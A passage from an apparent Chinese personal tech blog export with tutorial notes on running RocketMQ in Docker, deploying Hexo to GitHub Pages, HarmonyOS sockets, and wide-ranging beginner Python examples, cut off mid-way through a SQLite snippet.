pull apache/rocketmq:latest 启动 RocketMQ NameServer：RocketMQ 的 NameServer 是负责管理所有 Broker 节点的目录服务。可以使用以下命令启动 NameServer： 12345678docker run -d --name rmqnamesrv -p 9876:9876 apache/rocketmq:latest sh mqnamesrv```bash## 启动 RocketMQ Broker：RocketMQ 的 Broker 负责存储消息并处理生产者和消费者的请求。使用以下命令启动 Broker：```bashdocker run -d --name rmqbroker --link rmqnamesrv:namesrv -e &quot;NAMESRV_ADDR=namesrv:9876&quot; -e &quot;BROKER_NAME=broker-a&quot; -e &quot;BROKER_ID=0&quot; -e &quot;AUTO_CREATE_TOPIC_ENABLE=true&quot; -e &quot;AUTO_CREATE_SUBSCRIPTION_GROUP=true&quot; -p 10911:10911 -p 10909:10909 apache/rocketmq:latest sh mqbroker 验证查看 NameServer 日志： 1docker logs -f rmqnamesrv 查看 Broker 日志： 1docker logs -f rmqbroker 使用 RocketMQ Console：如果需要可视化管理 RocketMQ，可以运行 RocketMQ Console： 12docker pull styletang/rocketmq-console-ngdocker run -d -p 8080:8080 --link rmqnamesrv:namesrv -e &quot;JAVA_OPTS=-Drocketmq.namesrv.addr=namesrv:9876&quot; styletang/rocketmq-console-ng 总结 123456789101112# 拉取 RocketMQ 镜像docker pull apache/rocketmq:latest# 启动 NameServerdocker run -d --name rmqnamesrv -p 9876:9876 apache/rocketmq:latest sh mqnamesrv# 启动 Brokerdocker run -d --name rmqbroker --link rmqnamesrv:namesrv -e &quot;NAMESRV_ADDR=namesrv:9876&quot; -p 10911:10911 -p 10909:10909 apache/rocketmq:latest sh mqbroker# 启动 RocketMQ Consoledocker pull styletang/rocketmq-console-ngdocker run -d -p 8080:8080 --link rmqnamesrv:namesrv -e &quot;JAVA_OPTS=-Drocketmq.namesrv.addr=namesrv:9876&quot; styletang/rocketmq-console-ng 如果是外网环境run Broker 外网IP 123mkdir -p /usr/data/rocketMQ/data/broker/logsmkdir -p /usr/data/rocketMQ/data/broker/storemkdir -p /usr/data/rocketMQ/data/broker/conf/ broket.conf 12345678910brokerClusterName = DefaultClusterbrokerName = broker-abrokerId = 0deleteWhen = 04fileReservedTime = 48brokerRole = ASYNC_MASTERflushDiskType = ASYNC_FLUSHnamesrvAddr = 外网ip:9876brokerIP1 = 外网ipautoCreateTopicEnable=true 1docker run -p 0.0.0.0:10911:10911 -p 0.0.0.0:10909:10909 -d -v /usr/data/rocketMQ/data/broker/logs:/root/logs -v /usr/data/rocketMQ/data/broker/store:/root/store -v /usr/data/rocketMQ/data/broker/conf/broker.conf:/opt/rocketmq/conf/broker.conf --name rmqbroker --link rmqnamesrv:namesrv -e &quot;NAMESRV_ADDR=namesrv:9876&quot; -e &quot;MAX_POSSIBLE_HEAP=200000000&quot; -e &quot;autoCreateTopicEnable=true&quot; rocketmqinc/rocketmq sh mqbroker -c /opt/rocketmq/conf/broker.conf .NET RocketMQNuGet NewLife.RocketMQProducer123456789101112131415161718192021222324252627282930//main XTrace.UseConsole(); var producer = new Producer &#123; NameServerAddress = &quot;x.x.x.x:9876&quot;, Topic = &quot;t0529&quot; &#125;; try &#123; producer.Start(); // 发送一条测试消息，以确保 Topic 被创建 for (var i = 0; i &lt; 10; i++) &#123; var str = &quot;mqm&quot; + i; //var str = Rand.NextString(1337); var sr = producer.Publish(str, &quot;TagA&quot;); &#125; &#125; catch (Exception ex) &#123; Console.WriteLine($&quot;Exception: &#123;ex.Message&#125;&quot;); &#125; finally &#123; producer.Stop(); &#125; Consumer1234567891011121314151617181920var consumer = new Consumer&#123; Topic = &quot;t0529&quot;, Group = &quot;test&quot;, NameServerAddress = &quot;x.x.x.x:9876&quot;, FromLastOffset = false, //SkipOverStoredMsgCount = 0, //BatchSize = 20, Log = XTrace.Log, ClientLog = XTrace.Log,&#125;;consumer.OnConsume = OnConsume;consumer.Configure(MqSetting.Current);consumer.Start();_consumer = consumer;","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":".net","slug":"net","permalink":"https://banjinmei.github.io/tags/net/"},{"name":"RocketMQ","slug":"RocketMQ","permalink":"https://banjinmei.github.io/tags/RocketMQ/"}],"author":"mu"},{"title":"hexo githubio","slug":"hexo-githubio","date":"2024-05-27T19:38:21.000Z","updated":"2024-11-21T16:59:40.190Z","comments":true,"path":"2024/05/28/hexo-githubio/","permalink":"https://banjinmei.github.io/2024/05/28/hexo-githubio/","excerpt":"","text":"hexo安装npm install hexo-cli -ghexo init blogcd blognpm installhexo server key配置ssh-keygen -t ed25519 -C “&#x65;&#x6d;&#x61;&#x69;&#108;&#64;&#x65;&#x2e;&#x63;&#x6f;&#109;“添加key到github err&#x67;&#x69;&#116;&#64;&#x67;&#x69;&#116;&#x68;&#x75;&#x62;&#x2e;&#99;&#x6f;&#x6d;: Permission denied (publickey).fatal: Could not read from remote repository. 配置GitHub仓库在GitHub上创建一个新的仓库，其名称应该是 用户名.github.io，其中用户名是你的GitHub用户名。 git config –global user.email “&#x78;&#x78;&#64;&#x71;&#x71;&#46;&#99;&#x6f;&#109;“ git config –global user.name “user” _config.ymldeploy: type: git repo: # 替换为你的GitHub仓库url branch: master 安装hexo-deployer-git插件：npm install hexo-deployer-git –save 部署到GitHub：hexo cleanhexo g #hexo generatehexo d #hexo deploy 建立仓库 testhtmlSettings -&gt; pages https://xxx.github.io/testhtml/index.html","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"github","slug":"github","permalink":"https://banjinmei.github.io/tags/github/"},{"name":"hexo","slug":"hexo","permalink":"https://banjinmei.github.io/tags/hexo/"}],"author":"mu"},{"title":"HarmonyOS socket websocket","slug":"HarmonyOS-Socket","date":"2024-05-26T15:56:19.000Z","updated":"2024-08-29T14:30:26.000Z","comments":true,"path":"2024/05/26/HarmonyOS-Socket/","permalink":"https://banjinmei.github.io/2024/05/26/HarmonyOS-Socket/","excerpt":"","text":"socket1import socket from &#x27;@ohos.net.socket&#x27;; create 12345678910111213141516let tcp = socket.constructTCPSocketInstance();let promise = tcp.connect(&#123; address: &#123;address: &#x27;192.168.1.11&#x27;, port: 24524, family: 1&#125; , timeout: 6000&#125;);promise.then(() =&gt; &#123; console.log(&#x27;connect success&#x27;); tcp.send(&#123; data:&#x27;Hello, server!&#x27; &#125;,err =&gt; &#123; if (err) &#123; console.log(&#x27;send fail&#x27;); return; &#125; console.log(&#x27;send success&#x27;); &#125;)&#125;).catch(err =&gt; &#123; console.log(&#x27;connect fail&#x27;);&#125;); ERR系统识别到新的sdk路径 请清除模拟器数据后Sdk Path has been changed to xxx 1.在Local Emulator的设备列表窗口，点击“Wipe User Data”清除模拟器数据，然后重新启动模拟器。2.重新创建一个模拟器，然后启动新建的模拟器。 console.log Log &#x3D;&gt; show only js log ERR201module.json5添加 12345&quot;requestPermissions&quot;: [ &#123; &quot;name&quot;: &quot;ohos.permission.INTERNET&quot; &#125;] ERRconnect fail2301088 需添加本机IP 12345let bindAddress = &#123; address: &#x27;localhost&#x27;, port: 1234, family: 1 &#125;; node server 123456789101112131415161718const net = require(&#x27;net&#x27;);//createServerconst server = net.createServer((socket) =&gt; &#123; console.log(&#x27;client con&#x27;); socket.on(&#x27;data&#x27;, (data) =&gt; &#123; console.log(`rs from client : $&#123;data&#125;`); socket.write(`rs server : $&#123;data&#125;`); &#125;); socket.on(&#x27;end&#x27;, () =&gt; &#123; console.log(&#x27;client end &#x27;); &#125;);&#125;);server.listen(24524, () =&gt; &#123; console.log(&#x27;tcp run on 24524&#x27;);&#125;); run client ​ webscoket1import webSocket from &#x27;@ohos.net.webSocket&#x27;; 123456789101112let ws = webSocket.createWebSocket();let url = &quot;ws://xxx:24524&quot;ws.connect(url, (err, value) =&gt; &#123; let promise = ws.send(&quot;Hello, server!&quot;); promise.then((value) =&gt; &#123; console.log(&quot;send success&quot;) &#125;).catch((err) =&gt; &#123; console.log(&quot;send fail, error:&quot; + JSON.stringify(err)) &#125;);&#125;); 权限ohos.permission.INTERNET websocket更加简单一点~~ ​","categories":[{"name":"技术","slug":"技术","permalink":"https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[],"author":"mu"},{"title":"Python helloworld＞get/post mysql requests socket docker opencv flask fastapi debian ubuntu sparkai","slug":"Python-Base","date":"2024-05-26T15:02:42.000Z","updated":"2024-11-13T16:30:44.673Z","comments":true,"path":"2024/05/26/Python-Base/","permalink":"https://banjinmei.github.io/2024/05/26/Python-Base/","excerpt":"","text":"🌠setup安装python.org 🐷helloworld12if __name__ == &#x27;__main__&#x27;: print(&#x27;helloworld&#x27;) 1python test.py var变量 12345if __name__ == &#x27;__main__&#x27;: company, date, *others = [&#x27;hi&#x27;, &#x27;20240521&#x27;, &#x27;000&#x27;, &#x27;11111&#x27;] print(company, date) print(others) random随机 12345678910111213 i = 0rand_list = []while i &lt; 4: rand_num = random.randint(0, 499) if rand_num not in rand_list: rand_list.append(rand_num) i += 1 print(rand_list) list列表 可变 1234567891011121314151617181920212223242526# 创建一个空列表 my_list = [] # 向列表中添加元素 my_list.append(1) my_list.append(2) my_list.append(3) print(my_list) # 输出: [1, 2, 3] # 修改列表中的元素 my_list[1] = &#x27;two&#x27; print(my_list) # 输出: [1, &#x27;two&#x27;, 3] # 列表切片 sub_list = my_list[1:3] print(sub_list) # 输出: [&#x27;two&#x27;, 3] # 删除列表中的元素 del my_list[2] print(my_list) # 输出: [1, &#x27;two&#x27;]# 创建一个包含0到9的偶数列表 even_numbers = [i for i in range(10) if i % 2 == 0] print(even_numbers) # 输出: [0, 2, 4, 6, 8] tuple元组 不可变 123456789101112# 创建一个元组 my_tuple = (1, &#x27;two&#x27;, 3.0) print(my_tuple) # 输出: (1, &#x27;two&#x27;, 3.0) # 尝试修改元组中的元素（会抛出TypeError） ## my_tuple[1] = &#x27;Two&#x27; # 这行代码会报错，因为元组是不可变的 # 元组切片（虽然元组不可变，但你可以获取它的切片） sub_tuple = my_tuple[1:] print(sub_tuple) # 输出: (&#x27;two&#x27;, 3.0) if else判断 123456789age =5if age &gt;= 6: print(&#x27;teenager&#x27;)elif age &gt;= 20: print(&#x27;old&#x27;)else: print(&#x27;kid&#x27;) calculator计算器 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152def add(x, y): &quot;&quot;&quot;加法&quot;&quot;&quot; return x + ydef subtract(x, y): &quot;&quot;&quot;减法&quot;&quot;&quot; return x - ydef multiply(x, y): &quot;&quot;&quot;乘法&quot;&quot;&quot; return x * ydef divide(x, y): &quot;&quot;&quot;除法&quot;&quot;&quot; if y == 0: return &quot;错误：除数不能为0&quot; else: return x / yprint(&quot;选择操作：&quot;)print(&quot;1.加法&quot;)print(&quot;2.减法&quot;)print(&quot;3.乘法&quot;)print(&quot;4.除法&quot;)while True: choice = input(&quot;请输入你的选择(1/2/3/4): &quot;) if choice in (&#x27;1&#x27;, &#x27;2&#x27;, &#x27;3&#x27;, &#x27;4&#x27;): num1 = float(input(&quot;请输入第一个数字: &quot;)) num2 = float(input(&quot;请输入第二个数字: &quot;)) if choice == &#x27;1&#x27;: print(num1, &quot;+&quot;, num2, &quot;=&quot;, add(num1, num2)) elif choice == &#x27;2&#x27;: print(num1, &quot;-&quot;, num2, &quot;=&quot;, subtract(num1, num2)) elif choice == &#x27;3&#x27;: print(num1, &quot;*&quot;, num2, &quot;=&quot;, multiply(num1, num2)) elif choice == &#x27;4&#x27;: result = divide(num1, num2) print(num1, &quot;/&quot;, num2, &quot;=&quot;, result) # 检查用户是否想继续计算 next_calculation = input(&quot;想要进行下一次计算吗？(yes/no): &quot;) if next_calculation.lower() != &#x27;yes&#x27;: break else: print(&quot;非法输入，请重新输入&quot;) 123456789import requests# getresponse = requests.get(&#x27;https://jsonplaceholder.typicode.com/posts/1&#x27;)print(response.json())# postdata = &#123;&#x27;title&#x27;: &#x27;foo&#x27;, &#x27;body&#x27;: &#x27;bar&#x27;, &#x27;userId&#x27;: 1&#125;response = requests.post(&#x27;https://jsonplaceholder.typicode.com/posts&#x27;, json=data)print(response.json()) 🐏mail1234567891011121314151617181920212223242526272829303132333435import smtplib from email.mime.text import MIMEText from email.mime.multipart import MIMEMultipart # 设置邮件服务器和端口 smtp_server = &#x27;smtp.qq.com&#x27; smtp_port = 25 # 设置发件人和收件人信息 sender_email = &#x27;42@qq.com&#x27; # 邮箱地址 sender_password = &#x27;lpoumq&#x27; # 密码 receiver_email = &#x27;76@qq.com&#x27; # 收件人邮箱地址 msg = MIMEMultipart() msg[&#x27;From&#x27;] = sender_email msg[&#x27;To&#x27;] = receiver_email msg[&#x27;Subject&#x27;] = &#x27;Hello from Python&#x27; body = &#x27;This is a test email sent from Python. mmmmmmm &#x27; msg.attach(MIMEText(body, &#x27;plain&#x27;)) with smtplib.SMTP(smtp_server, smtp_port) as server: server.starttls() server.login(sender_email, sender_password) # 发送邮件 server.sendmail(sender_email, receiver_email, msg.as_string()) print(&#x27;Email sent successfully!&#x27;) 🐴socketclient 1234567891011121314151617181920212223242526import socket def connect_to_socket(host, port): # 创建一个新的socket对象，指定IPv4和TCP client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # 连接到服务器 try: client_socket.connect((host, port)) print(f&quot;成功连接到 &#123;host&#125;:&#123;port&#125;&quot;) message = &quot;Hello, Server!&quot;.encode(&#x27;utf-8&#x27;) client_socket.sendall(message) # 接收数据 data = client_socket.recv(1024) print(f&quot;从服务器接收到的数据: &#123;data.decode(&#x27;utf-8&#x27;)&#125;&quot;) except Exception as e: print(f&quot;连接失败: &#123;e&#125;&quot;) finally: # 关闭socket连接 client_socket.close() connect_to_socket(&#x27;localhost&#x27;, 6001) server 12345678910111213141516171819202122232425262728293031323334353637383940414243import socket def start_server(host, port): server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # 绑定socket到指定的地址和端口 server_address = (host, port) print(f&quot;服务器将运行在 &#123;host&#125;:&#123;port&#125;&quot;) server_socket.bind(server_address) # 开始监听连接 server_socket.listen(1) while True: print(&quot;等待客户端连接...&quot;) connection, client_address = server_socket.accept() try: print(f&quot;客户端 &#123;client_address&#125; 已连接&quot;) # 接收数据 while True: data = connection.recv(1024) if not data: print(&quot;客户端已断开连接&quot;) break print(f&quot;从 &#123;client_address&#125; 接收到的数据: &#123;data.decode(&#x27;utf-8&#x27;)&#125;&quot;) # 发送一些数据回客户端 response = &quot;Hello from server!&quot;.encode(&#x27;utf-8&#x27;) connection.sendall(response) except ConnectionResetError: print(&quot;客户端异常断开连接&quot;) finally: # 清理连接 connection.close() start_server(&#x27;localhost&#x27;, 6002) 🐍dockerserver123456789101112131415161718192021222324# testdk.pyimport socketdef run_server(): host = &#x27;0.0.0.0&#x27; # 监听所有网络接口 port = 12345 # 自定义端口号 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: s.bind((host, port)) s.listen() print(f&quot;Server listening on &#123;host&#125;:&#123;port&#125;&quot;) while True: conn, addr = s.accept() with conn: print(f&quot;Connected by &#123;addr&#125;&quot;) data = conn.recv(1024) if not data: break conn.sendall(data)if __name__ == &quot;__main__&quot;: run_server() Dockerfile1234567891011# DockerfileFROM python:3.8-slim-busterWORKDIR /appCOPY requirements.txt ./RUN pip install --no-cache-dir -r requirements.txtCOPY . .CMD [&quot;python&quot;, &quot;./testdk.py&quot;] build1docker build -t my-python-socket-server . run1docker run -d -p 12345:12345 my-python-socket-server client test123456789# testdkclient2.pyimport socketwith socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s: s.connect((&#x27;localhost&#x27;, 12345)) s.sendall(b&#x27;Hello, Server!mmmm&#x27;) data = s.recv(1024) print(&#x27;Received&#x27;, repr(data)) 🐲GraphicsTurtle123456789101112131415161718192021222324252627# 导入turtle包的所有内容:from turtle import *# 设置笔刷宽度:width(5)# 前进:forward(100)# 右转90度:right(90)# 笔刷颜色:pencolor(&#x27;yellow&#x27;)forward(150)right(90)pencolor(&#x27;red&#x27;)forward(100)right(90)pencolor(&#x27;blue&#x27;)forward(100)right(90)# 调用done()使得窗口等待被关闭，否则将立刻关闭窗口:done() 12345678910111213141516171819202122232425262728import turtle # 初始化turtle window = turtle.Screen() window.bgcolor(&quot;white&quot;) # 设置背景颜色为黑色 love = turtle.Turtle() love.speed(1) # 设置绘图速度，1是最慢，0是最快 love.color(&quot;red&quot;, &quot;pink&quot;) # 设置画笔颜色和填充颜色 love.begin_fill() # 开始填充颜色 # 绘制爱心的左半部分 love.left(140) love.forward(180) love.circle(-100, 200) # 绘制一个半径为100，弧度为200的圆（圆心在左侧） # 绘制爱心的右半部分 love.left(120) love.circle(-100, 200) # 绘制一个半径为100，弧度为200的圆（圆心在右侧） # 回到起点并结束填充 love.forward(180) love.end_fill() # 隐藏turtle图标 love.hideturtle() # 结束绘制，等待用户关闭窗口 turtle.done() tkinter12345678910111213import tkinter as tk def on_closing(): root.destroy() # 当点击关闭按钮时调用 root = tk.Tk() root.protocol(&quot;WM_DELETE_WINDOW&quot;, on_closing) label = tk.Label(root, text=&quot;Hello, Tkinter!&quot;) label.pack() root.mainloop() 下班！123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960import tkinter as tkfrom tkinter import messageboxfrom datetime import datetime, timedeltaimport timedef validate_time(input_time): &quot;&quot;&quot;验证输入的时间格式是否正确&quot;&quot;&quot; try: time.strptime(input_time, &#x27;%H:%M:%S&#x27;) return True except ValueError: return Falsedef start_countdown(): input_time = entry.get() if validate_time(input_time): target_time = datetime.strptime(input_time, &#x27;%H:%M:%S&#x27;) today = datetime.combine(datetime.today(), datetime.min.time()) target_datetime = datetime.combine(today, target_time.time()) if target_datetime &lt; datetime.now(): target_datetime += timedelta(days=1) def update_countdown(): now = datetime.now() remaining_time = target_datetime - now if remaining_time.total_seconds() &lt;= 0: label.config(text=&quot;下班!头也不回&quot;) messagebox.showinfo(&quot;Timer&quot;, &quot;下班!头也不回&quot;) else: hours, remainder = divmod(remaining_time.seconds, 3600) minutes, seconds = divmod(remainder, 60) label.config(text=f&quot;&#123;hours:02d&#125;:&#123;minutes:02d&#125;:&#123;seconds:02d&#125;&quot;) window.after(1000, update_countdown) # timeout update_countdown() else: messagebox.showerror(&quot;Error&quot;, &quot;时间必须是 HH:MM:SS.&quot;)# windowwindow = tk.Tk()window.title(&quot;下班!头也不回&quot;)window.geometry(&quot;400x300&quot;)# Entrytk.Label(window, text=&quot;下班时间 &gt; HH:MM:SS :&quot;).pack()entry = tk.Entry(window)entry.pack()# Buttonstart_button = tk.Button(window, text=&quot;开始摸鱼🐟&quot;, command=start_countdown)start_button.pack()start_button.pack(pady=10)label = tk.Label(window, text=&quot;&quot;, font=(&quot;Helvetica&quot;, 48))label.pack(pady=20)window.mainloop() 🐇opencv1pip install opencv-python 1234567891011import cv2#readimage = cv2.imread(&#x27;e1.jpg&#x27;)if image is None: print(&quot;Error: Image not found or unable to read.&quot;)else: cv2.imshow(&#x27;Image&#x27;, image) cv2.waitKey(0) cv2.destroyAllWindows() cv2.imwrite(&#x27;output.jpg&#x27;, image) 12#反色处理 inverted_image = cv2.bitwise_not(image) Pillow PIL图像处理库 1pip install Pillow 1234567891011121314151617181920212223242526272829303132333435363738394041from PIL import Image# 加载图片image = Image.open(&#x27;e1.jpg&#x27;)image.show()# 缩放到宽度为300，高度等比例缩放image = Image.open(&#x27;e1.jpg&#x27;)image_resized = image.resize((300, image.height * 300 // image.width))# saveimage_resized.save(&#x27;resized240525.jpg&#x27;)# 转换成PNG格式image = Image.open(&#x27;e1.jpg&#x27;)image.save(&#x27;png240525.png&#x27;, format=&#x27;PNG&#x27;)# 转换成PNG格式image = Image.open(&#x27;png240525.png&#x27;)image.save(&#x27;j240525.jpg&#x27;, format=&#x27;jpeg&#x27;)# 裁剪图片，参数是左上角和右下角的坐标image = Image.open(&#x27;e1.jpg&#x27;)cropped_image = image.crop((100, 100, 400, 400))cropped_image.show()cropped_image.save(&#x27;cropped_image240525.jpg&#x27;)# 顺时针旋转90度image = Image.open(&#x27;e1.jpg&#x27;)rotated_image = image.rotate(90)rotated_image.show()rotated_image.save(&#x27;rotated_image240525.jpg&#x27;)from PIL import Image, ImageFilter#模糊滤镜image = Image.open(&#x27;e1.jpg&#x27;)blurred_image = image.filter(ImageFilter.BLUR)blurred_image.show()blurred_image.save(&#x27;blurred_image240525.jpg&#x27;) 🐯PyTorch机器学习 12pip install torch torchvisionpip install pillow 123456789101112131415161718192021222324252627282930313233import torchimport torchvision.transforms as transformsfrom torchvision.models import resnet50from PIL import Image# ResNet50model = resnet50(pretrained=True)model.eval() #eval# transform transform = transforms.Compose([ transforms.Resize(256), transforms.CenterCrop(224), transforms.ToTensor(), transforms.Normalize(mean=[0.485, 0.456, 0.406], std=[0.229, 0.224, 0.225]),])# PILimage_path = &#x27;e1.jpg&#x27; image = Image.open(image_path)# transform imageimage_tensor = transform(image)image_tensor = image_tensor.unsqueeze(0) # 添加batch维度# tensoroutput = model(image_tensor)# predictedclass _, pred = output.max(1)predicted_class = pred.item()print(&quot;Predicted class index:&quot;, predicted_class) 🐂web1234567891011# 从wsgiref模块导入:from wsgiref.simple_server import make_server# 导入我们自己编写的application函数:from hi import application# 创建一个服务器，IP地址为空，端口是8000，处理函数是application:httpd = make_server(&#x27;&#x27;, 8000, application)print(&#x27;Serving HTTP on port 8000...&#x27;)# 开始监听HTTP请求:httpd.serve_forever() 1234#hi.pydef application(environ, start_response): start_response(&#x27;200 OK&#x27;, [(&#x27;Content-Type&#x27;, &#x27;text/html&#x27;)]) return [b&#x27;&lt;h1&gt;Hello, web!&lt;/h1&gt;&#x27;] flask1pip install flask 123456789101112131415161718192021222324252627from flask import Flaskfrom flask import requestapp = Flask(__name__)@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def home(): return &#x27;&lt;h1&gt;Home&lt;/h1&gt;&#x27;@app.route(&#x27;/login&#x27;, methods=[&#x27;GET&#x27;])def signin_form(): return &#x27;&#x27;&#x27;&lt;form action=&quot;/login&quot; method=&quot;post&quot;&gt; &lt;p&gt;&lt;input name=&quot;username&quot;&gt;&lt;/p&gt; &lt;p&gt;&lt;input name=&quot;password&quot; type=&quot;password&quot;&gt;&lt;/p&gt; &lt;p&gt;&lt;button type=&quot;submit&quot;&gt;Sign In&lt;/button&gt;&lt;/p&gt; &lt;/form&gt;&#x27;&#x27;&#x27;@app.route(&#x27;/login&#x27;, methods=[&#x27;POST&#x27;])def signin(): # 需要从request对象读取表单内容： if request.form[&#x27;username&#x27;]==&#x27;admin&#x27; and request.form[&#x27;password&#x27;]==&#x27;123123&#x27;: return &#x27;&lt;h3&gt;Hello, admin!&lt;/h3&gt;&#x27; return &#x27;&lt;h3&gt;Bad username or password.&lt;/h3&gt;&#x27;if __name__ == &#x27;__main__&#x27;: app.run() fastapi1pip install fastapi uvicorn[standard] 123456789101112131415#y.pfrom fastapi import FastAPI app = FastAPI() @app.get(&quot;/&quot;) def read_root(): return &#123;&quot;Hello&quot;: &quot;World&quot;&#125; @app.get(&quot;/items/&#123;item_id&#125;&quot;) def read_item(item_id: int, q: str = None): return &#123;&quot;item_id&quot;: item_id, &quot;q&quot;: q&#125; 1uvicorn y:app --reload 12http://127.0.0.1:8000/ &#123;&quot;Hello&quot;: &quot;World&quot;&#125;，http://127.0.0.1:8000/items/5?q=m &#123;&quot;item_id&quot;: 5, &quot;q&quot;: &quot;m&quot;&#125; 🐭debian setup python3.91sudo apt update 1sudo apt install -y wget build-essential libreadline-gplv2-dev libncursesw5-dev libssl-dev libsqlite3-dev tk-dev libgdbm-dev libc6-dev libbz2-dev 123#dlcd /usr/srcsudo wget https://www.python.org/ftp/python/3.9.0/Python-3.9.0.tgz 12sudo tar xzf Python-3.9.0.tgzcd Python-3.9.0 12sudo ./configure --enable-optimizationssudo make -j 4 # 替换4为你的CPU核心数 1sudo make altinstall # 使用altinstall以避免覆盖系统默认的python版本 1python3.9 --version ubuntu python1sudo apt update 1sudo apt install -y make build-essential libssl-dev zlib1g-dev libbz2-dev libreadline-dev libsqlite3-dev wget curl llvm libncurses5-dev libncursesw5-dev xz-utils tk-dev libffi-dev liblzma-dev 1wget https://www.python.org/ftp/python/3.12.0/Python-3.12.0.tgz 1tar -xzf Python-3.12.0.tgz -C /usr/local/src/ 1cd /usr/local/src/Python-3.12.0/ 1./configure --prefix=/usr/local 1make 1sudo make install ☄️aispark_ai讯飞星火认知大模型v3.5 1apt install python3-pip 1pip install --upgrade spark_ai_python 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253# coding: utf-8import SparkApiimport timeappid = &quot;xxx&quot; #填写控制台中获取的 APPID 信息api_secret = &quot;xxx&quot; #填写控制台中获取的 APISecret 信息api_key =&quot;xxx&quot; #填写控制台中获取的 APIKey 信息domain = &quot;generalv3.5&quot; Spark_url = &quot;wss://spark-api.xf-yun.com/v3.5/chat&quot; # v3.5环服务地址#初始上下文内容，当前可传system、user、assistant 等角色text =[ # &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;你是谁&quot;&#125;, # 用户的历史问题]def getText(role,content): jsoncon = &#123;&#125; jsoncon[&quot;role&quot;] = role jsoncon[&quot;content&quot;] = content text.append(jsoncon) return textdef getlength(text): length = 0 for content in text: temp = content[&quot;content&quot;] leng = len(temp) length += leng return lengthdef checklen(text): while (getlength(text) &gt; 8000): del text[0] return text if __name__ == &#x27;__main__&#x27;: while(1): Input = input(&quot;\\n&quot; +&quot;我:&quot;) question = checklen(getText(&quot;user&quot;,Input)) SparkApi.answer =&quot;&quot; print(&quot;星火:&quot;,end =&quot;&quot;) SparkApi.main(appid,api_key,api_secret,Spark_url,domain,question) # print(SparkApi.answer) getText(&quot;assistant&quot;,SparkApi.answer) ERNIE-4.0千帆4.0 1234567891011121314151617181920212223242526272829303132333435363738import requestsimport jsondef get_access_token(): url = &quot;https://aip.baidubce.com/oauth/2.0/token?grant_type=client_credentials&amp;client_id=xx&amp;client_secret=xx&quot; payload = json.dumps(&quot;&quot;) headers = &#123; &#x27;Content-Type&#x27;: &#x27;application/json&#x27;, &#x27;Accept&#x27;: &#x27;application/json&#x27; &#125; response = requests.request(&quot;POST&quot;, url, headers=headers, data=payload) return response.json().get(&quot;access_token&quot;)def main(): url = &quot;https://aip.baidubce.com/rpc/2.0/ai_custom/v1/wenxinworkshop/chat/ernie-4.0-8k-preview?access_token=&quot; + get_access_token() payload = json.dumps(&#123; &quot;messages&quot;: [ &#123; &quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;Python是最好的语言&quot; &#125; ] &#125;) headers = &#123; &#x27;Content-Type&#x27;: &#x27;application/json&#x27; &#125; response = requests.request(&quot;POST&quot;, url, headers=headers, data=payload) print(response.text) if __name__ == &#x27;__main__&#x27;: main() 12345python3 ai.py&#123;&quot;id&quot;:&quot;as-7bdgaekpn4&quot;,&quot;object&quot;:&quot;chat.completion&quot;,&quot;created&quot;:1716369031,&quot;result&quot;:&quot;\\&quot;Python是最好的语言\\&quot;这一说法是主观的，并不适用于所有情况。Python确实是一种强大且流行的编程语言，具有许多优点，但它并不一定是所有情况下的最佳选择。以下是对这一说法的详细分析：\\n\\n### Python的优点：\\n\\n1. **易读易写**：Python的语法清晰简洁，易于理解，这使得它成为初学者和专业开发者都喜爱的语言。\\n\\n2. **广泛的库和框架**：Python有大量的第三方库和框架可供使用，如NumPy、Pandas、TensorFlow等，这些库使得Python在数据科学、Web开发、机器学习等领域具有显著优势。\\n\\n3. **跨平台兼容性**：Python可以在多种操作系统上运行，包括Windows、macOS和Linux。\\n\\n4. **动态类型系统**：Python是动态类型的语言，这意味着开发者不需要在声明变量时指定其类型，这增加了编程的灵活性。\\n\\n### Python的局限性：\\n\\n1. **性能**：与C++或Java等编译型语言相比，Python在执行速度上可能较慢，尤其是在处理大量数据或进行复杂计算时。\\n\\n2. **类型安全**：由于Python是动态类型的，这可能导致类型错误在运行时才被发现，而不是在编译阶段。\\n\\n3. **移动开发限制**：虽然Python可以用于开发Web应用和桌面应用，但它在移动应用开发（如iOS和Android应用）方面并不是主流选择。\\n\\n4. **内存消耗**：Python的内存管理可能不如某些其他语言高效，特别是在处理大量数据时。\\n\\n### 结论：\\n\\nPython是否是最好的语言取决于具体的使用场景和需求。对于数据科学、Web开发、脚本编写和自动化任务等，Python确实是一个出色的选择。然而，在需要高性能计算、内存优化或特定于移动平台的开发任务中，其他语言可能更为合适。\\n\\n因此，\\&quot;Python是最好的语言\\&quot;这一说法是片面的。在选择编程语言时，应根据项目的具体需求和上下文来做出决策。&quot;,&quot;is_truncated&quot;:false,&quot;need_clear_history&quot;:false,&quot;finish_reason&quot;:&quot;normal&quot;,&quot;usage&quot;:&#123;&quot;prompt_tokens&quot;:3,&quot;completion_tokens&quot;:403,&quot;total_tokens&quot;:406&#125;&#125; pyhton sqlite123456789101112131415161718192021222324252627282930313233343536373839404142import sqlite3# 1. 连接到 SQLite 数据库# 如果数据库文件不存在，会自动创建一个conn = sqlite3.connect(&#x27;example.db&#x27;)# 2. 创建游标对象，用于执行 SQL 语句cursor = conn.cursor()# 3. 创建一个表（如果表不存在）cursor.execute(&#x27;&#x27;&#x27; CREATE TABLE IF NOT EXISTS users ( id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL, age INTEGER NOT NULL )&#x27;&#x27;&#x27;)# 4. 插入数据cursor.execute(&quot;INSERT INTO users (name, age) VALUES (?, ?)&quot;, (&#x27;py1&#x27;, 30))cursor.execute(&quot;INSERT INTO users (name, age) VALUES (?, ?)&quot;, (&#x27;py2&#x27;, 24))# 提交事务conn.commit()# 5. 